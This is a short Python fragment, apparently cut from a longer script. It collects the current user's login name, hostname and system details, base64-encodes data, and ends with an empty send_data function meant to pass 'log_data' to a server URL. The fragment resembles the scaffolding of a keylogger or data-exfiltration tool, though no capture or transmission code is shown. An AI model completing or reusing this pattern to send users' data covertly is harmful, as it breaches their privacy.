def get_os_info():
    """Gets OS information."""
    return {
        "username": os.getlogin(),
        "hostname": os.uname()[1],
        "system": os.name,
        "version": os.sys.version
    }

def encode_data(data):
    """Encodes data to base64."""
    return base64.b64encode(data.encode()).decode()

def send_data(log_data, server_url):
    """Sends data to the server."""
